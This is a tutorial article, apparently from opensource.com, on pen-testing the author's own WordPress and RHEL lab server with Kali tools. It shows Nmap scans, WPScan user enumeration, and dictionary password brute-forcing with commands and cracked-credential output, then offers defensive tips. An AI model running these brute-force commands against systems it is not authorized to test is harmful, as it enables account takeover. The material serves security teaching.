[#]: subject: (Pen testing with Linux security tools)
[#]: via: (https://opensource.com/article/21/5/linux-security-tools)
[#]: author: (Peter Gervase https://opensource.com/users/pgervase)
[#]: collector: (lujun9972)
[#]: translator: ( )
[#]: reviewer: ( )
[#]: publisher: ( )
[#]: url: ( )

Pen testing with Linux security tools
======
Use Kali Linux and other open source tools to uncover security gaps and
weaknesses in your systems.
![Magnifying glass on code][1]

The multitude of well-publicized breaches of large consumer corporations underscores the critical importance of system security management. Fortunately, there are many different applications that help secure computer systems. One is [Kali][2], a Linux distribution developed for security and penetration testing. This article demonstrates how to use Kali Linux to investigate your system to find weaknesses.

Kali installs a lot of tools, all of which are open source, and having them installed by default makes things easier.

![Kali's tools][3]

(Peter Gervase, [CC BY-SA 4.0][4])

The systems that I'll use in this tutorial are:

  1. `kali.usersys.redhat.com`: This is the system where I'll launch the scans and attacks. It has 30GB of memory and six virtualized CPUs (vCPUs).
  2. `vulnerable.usersys.redhat.com`: This is a Red Hat Enterprise Linux 8 system that will be the target. It has 16GB of memory and six vCPUs. This is a relatively up-to-date system, but some packages might be out of date.
  3. This system also includes `httpd-2.4.37-30.module+el8.3.0+7001+0766b9e7.x86_64`, `mariadb-server-10.3.27-3.module+el8.3.0+8972+5e3224e9.x86_64`, `tigervnc-server-1.9.0-15.el8_1.x86_64`, `vsftpd-3.0.3-32.el8.x86_64`, and WordPress version 5.6.1.



I included the hardware specifications above because some of these tasks are pretty demanding, especially for the target system's CPU when running the WordPress Security Scanner ([WPScan][5]).

### Investigate your system

I started my investigation with a basic Nmap scan on my target system. (You can dive deeper into Nmap by reading [Using Nmap results to help harden Linux systems][6].) An Nmap scan is a quick way to get an overview of which ports and services are visible from the system initiating the Nmap scan.

![Nmap scan][7]

(Peter Gervase, [CC BY-SA 4.0][4])

This default scan shows that there are several possibly interesting open ports. In reality, any open port is possibly interesting because it could be a way for an attacker to breach your network. In this example, ports 21, 22, 80, and 443 are nice to scan because they are commonly used services. At this early stage, I'm simply doing reconnaissance work and trying to get as much information about the target system as I can.

I want to investigate port 80 with Nmap, so I use the `-p 80` argument to look at port 80 and `-A` to get information such as the operating system and application version.

![Nmap scan of port 80][8]

(Peter Gervase, [CC BY-SA 4.0][4])

Some of the key lines in this output are:


```
PORT   STATE SERVICE VERSION
80/tcp open  http       Apache httpd 2.4.37 ((Red Hat Enterprise Linux))
|_http-generator: WordPress 5.6.1
```

Since I now know this is a WordPress server, I can use WPScan to get information about potential weaknesses. A good investigation to run is to try to find some usernames. Using `--enumerate u` tells WPScan to look for users in the WordPress instance. For example:


```
┌──(root💀kali)-[~]
└─# wpscan --url vulnerable.usersys.redhat.com --enumerate u
_______________________________________________________________
        __              _______   _____
        \ \     / /  __ \ / ____|
        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
        \ \/  \/ / |  ___/ \\___ \ / __|/ _` | '_ \
                \  /\  /  | |   ____) | (__| (_| | | | |
                \/  \/   |_|    |_____/ \\___|\\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                        Version 3.8.10
        Sponsored by Automattic - <https://automattic.com/>
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: <http://vulnerable.usersys.redhat.com/> [10.19.47.242]
[+] Started: Tue Feb 16 21:38:49 2021

Interesting Finding(s):
...
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] pgervase
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

This shows there are two users: `admin` and `pgervase`. I'll try to guess the password for `admin` by using a password dictionary, which is a text file with lots of possible passwords. The dictionary I used was 37G and had 3,543,076,137 lines.

Like there are multiple text editors, web browsers, and other applications you can choose from, there are multiple tools available to launch password attacks. Here are two example commands using Nmap and WPScan:


```
`# nmap -sV --script http-wordpress-brute --script-args userdb=users.txt,passdb=/path/to/passworddb,threads=6 vulnerable.usersys.redhat.com`[/code] [code]`# wpscan --url vulnerable.usersys.redhat.com --passwords /path/to/passworddb --usernames admin --max-threads 50 | tee nmap.txt`
```

This Nmap script is one of many possible scripts I could have used, and scanning the URL with WPScan is just one of many possible tasks this tool can do. You can decide which you would prefer to use

This WPScan example shows the password at the end of the file:


```
┌──(root💀kali)-[~]
└─# wpscan --url vulnerable.usersys.redhat.com --passwords passwords.txt --usernames admin
_______________________________________________________________
        __              _______   _____
        \ \     / /  __ \ / ____|
        \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
        \ \/  \/ / |  ___/ \\___ \ / __|/ _` | '_ \
                \  /\  /  | |   ____) | (__| (_| | | | |
                \/  \/   |_|    |_____/ \\___|\\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                        Version 3.8.10
        Sponsored by Automattic - <https://automattic.com/>
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: <http://vulnerable.usersys.redhat.com/> [10.19.47.242]
[+] Started: Thu Feb 18 20:32:13 2021

Interesting Finding(s):

…..

[+] Performing password attack on Wp Login against 1 user/s
Trying admin / redhat Time: 00:01:57 &lt;==================================================================================================================&gt; (3231 / 3231) 100.00% Time: 00:01:57
Trying admin / redhat Time: 00:01:57 &lt;=========================================================                                                         &gt; (3231 / 6462) 50.00%  ETA: ??:??:??
[SUCCESS] - admin / redhat                                                                                                                                                                      

[!] Valid Combinations Found:
 | Username: admin, Password: redhat

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at <https://wpscan.com/register>

[+] Finished: Thu Feb 18 20:34:15 2021
[+] Requests Done: 3255
[+] Cached Requests: 34
[+] Data Sent: 1.066 MB
[+] Data Received: 24.513 MB
[+] Memory used: 264.023 MB
[+] Elapsed time: 00:02:02
```

The Valid Combinations Found section near the end contains the admin username and password. It took only two minutes to go through 3,231 lines.

I have another dictionary file with 3,238,659,984 unique entries, which would take much longer and leave a lot more evidence.

Using Nmap produces a result much faster:


```
┌──(root💀kali)-[~]
└─# nmap -sV --script http-wordpress-brute --script-args userdb=users.txt,passdb=password.txt,threads=6 vulnerable.usersys.redhat.com
Starting Nmap 7.91 ( <https://nmap.org> ) at 2021-02-18 20:48 EST
Nmap scan report for vulnerable.usersys.redhat.com (10.19.47.242)
Host is up (0.00015s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 8.0 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.37 ((Red Hat Enterprise Linux))
|_http-server-header: Apache/2.4.37 (Red Hat Enterprise Linux)
| http-wordpress-brute:
|   Accounts:
|       admin:redhat - Valid credentials              &lt;&lt;&lt;&lt;&lt;&lt;&lt;
|       pgervase:redhat - Valid credentials         &lt;&lt;&lt;&lt;&lt;&lt;&lt;
|_  Statistics: Performed 6 guesses in 1 seconds, average tps: 6.0
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version     port/proto  service
|   100000  2,3,4       111/tcp   rpcbind
|   100000  2,3,4       111/udp   rpcbind
|   100000  3,4         111/tcp6  rpcbind
|_  100000  3,4         111/udp6  rpcbind
3306/tcp open  mysql   MySQL 5.5.5-10.3.27-MariaDB
MAC Address: 52:54:00:8C:A1:C0 (QEMU virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```

However, running a scan like this can leave a flood of HTTPD logging messages on the target system:


```
10.19.47.170 - - [18/Feb/2021:20:14:01 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:00 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:02 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:02 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
10.19.47.170 - - [18/Feb/2021:20:14:02 -0500] "POST /wp-login.php HTTP/1.1" 200 7575 "<http://vulnerable.usersys.redhat.com/>" "WPScan v3.8.10 (<https://wpscan.org/>)"
```

To get information about the HTTPS server found in my initial Nmap scan, I used the `sslscan` command:


```
┌──(root💀kali)-[~]
└─# sslscan vulnerable.usersys.redhat.com
Version: 2.0.6-static
OpenSSL 1.1.1i-dev  xx XXX xxxx

Connected to 10.19.47.242

Testing SSL server vulnerable.usersys.redhat.com on port 443 using SNI name vulnerable.usersys.redhat.com

  SSL/TLS Protocols:
SSLv2   disabled
SSLv3   disabled
TLSv1.0   disabled
TLSv1.1   disabled
TLSv1.2   enabled
TLSv1.3   enabled
&lt;snip&gt;
```

This shows information about the enabled SSL protocols and, further down in the output, information about the Heartbleed vulnerability:


```
  Heartbleed:
TLSv1.3 not vulnerable to heartbleed
TLSv1.2 not vulnerable to heartbleed
```

### Tips for preventing or mitigating attackers

There are many ways to defend your systems against the multitude of attackers out there. A few key points are:

  * **Know your systems:** This includes knowing which ports are open, what ports should be open, who should be able to see those open ports, and what is the expected traffic on those services. Nmap is a great tool to learn about systems on the network.
  * **Use current best practices:** What is considered a best practice today might not be a best practice down the road. As an admin, it's important to stay up to date on trends in the infosec realm.
  * **Know how to use your products:** For example, rather than letting an attacker continually hammer away at your WordPress system, block their IP address and limit the number of times they can try to log in before getting blocked. Blocking the IP address might not be as helpful in the real world because attackers are likely to use compromised systems to launch attacks. However, it's an easy setting to enable and could block some attacks.
  * **Maintain and verify good backups:** If an attacker comprises one or more of your systems, being able to rebuild from known good and clean backups could save lots of time and money.
  * **Check your logs:** As the examples above show, scanning and penetration commands may leave lots of logs indicating that an attacker is targeting the system. If you notice them, you can take preemptive action to mitigate the risk.
  * **Update your systems, their applications, and any extra modules:** As [NIST Special Publication 800-40r3][9] explains, "patches are usually the most effective way to mitigate software flaw vulnerabilities, and are often the only fully effective solution."
  * **Use the tools your vendors provide:** Vendors have different tools to help you maintain their systems, so make sure you take advantage of them. For example, [Red Hat Insights][10], included with Red Hat Enterprise Linux subscriptions, can help tune your systems and alert you to potential security threats.



### Learn more

This introduction to security tools and how to use them is just the tip of the iceberg. To dive deeper, you might want to look into the following resources:

  * [Armitage][11], an open source attack management tool
  * [Red Hat Product Security Center][12]
  * [Red Hat Security Channel][13]
  * [NIST's Cybersecurity page][14]
  * [Using Nmap results to help harden Linux systems][6]



--------------------------------------------------------------------------------

via: https://opensource.com/article/21/5/linux-security-tools

作者：[Peter Gervase][a]
选题：[lujun9972][b]
译者：[译者ID](https://github.com/译者ID)
校对：[校对者ID](https://github.com/校对者ID)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出

[a]: https://opensource.com/users/pgervase
[b]: https://github.com/lujun9972
[1]: https://opensource.com/sites/default/files/styles/image-full-size/public/lead-images/find-file-linux-code_magnifying_glass_zero.png?itok=E2HoPDg0 (Magnifying glass on code)
[2]: https://www.kali.org/
[3]: https://opensource.com/sites/default/files/uploads/kali-tools.png (Kali's tools)
[4]: https://creativecommons.org/licenses/by-sa/4.0/
[5]: https://wpscan.com/wordpress-security-scanner
[6]: https://www.redhat.com/sysadmin/using-nmap-harden-systems
[7]: https://opensource.com/sites/default/files/uploads/nmap-scan.png (Nmap scan)
[8]: https://opensource.com/sites/default/files/uploads/nmap-port80.png (Nmap scan of port 80)
[9]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-40r3.pdf%5D(https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-40r3.pdf
[10]: https://www.redhat.com/sysadmin/how-red-hat-insights
[11]: https://en.wikipedia.org/wiki/Armitage_(computing)
[12]: https://access.redhat.com/security
[13]: https://www.redhat.com/en/blog/channel/security
[14]: https://www.nist.gov/cybersecurity
